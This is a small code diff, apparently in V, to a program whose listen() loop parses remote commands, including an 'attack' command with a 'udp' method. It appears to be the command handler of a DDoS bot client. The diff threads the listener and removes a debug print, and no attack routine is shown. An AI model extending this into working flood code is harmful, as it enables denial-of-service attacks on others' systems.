@@ -32,7 +32,8 @@ pub struct DeviceInfo
 fn main() 
 {
 	for {
-		listen()
+		t := go listen()
+		t.wait()
 	}
 }
 
@@ -66,7 +67,6 @@ fn listen()
 			"attack" {
 
 				if args.len == 5 {
-					println("${args[4]} CAUGHT A NEW ATTACKSKIIIIIIIIIII")
 					match args[4]
 					{
 						"udp" {
